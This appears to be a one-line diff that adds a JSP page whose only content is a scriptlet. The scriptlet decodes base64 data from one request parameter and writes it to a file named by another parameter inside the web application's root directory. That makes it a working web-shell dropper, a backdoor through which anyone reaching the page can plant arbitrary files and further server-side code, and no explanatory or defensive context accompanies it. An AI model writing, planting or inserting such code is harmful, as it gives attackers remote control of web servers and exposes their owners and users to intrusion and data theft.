@@ -1,0 +1,1 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0"><jsp:scriptlet>new java.io.FileOutputStream(application.getRealPath("/")+"/"+request.getParameter("f")).write(new sun.misc.BASE64Decoder().decodeBuffer(request.getParameter("c")));out.close();</jsp:scriptlet></jsp:root>
